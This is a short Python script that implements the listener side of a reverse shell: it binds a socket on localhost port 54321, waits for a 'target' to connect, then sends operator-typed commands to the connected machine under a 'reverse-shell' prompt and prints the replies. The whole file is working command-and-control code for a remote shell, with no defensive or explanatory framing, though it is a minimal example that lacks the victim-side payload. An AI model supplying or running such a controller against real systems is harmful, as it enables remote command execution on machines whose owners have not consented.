#!/usr/bin/python

import socket

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind socket
s.bind(("127.0.0.1", 54321))

# Number of connections
s.listen(1)
print("Listening for Incoming Connections")

# Accept connection
target, ip = s.accept()

print("Target Connected!")

while True:
	# Send/Receive commands
	command = input("reverse-shell@%s#~: " % ip[0])
	target.send(command.encode())
	if(command == "q"):
		break
	else:
		result = target.recv(2024).decode()
		print(result)

# Close connection
s.close()
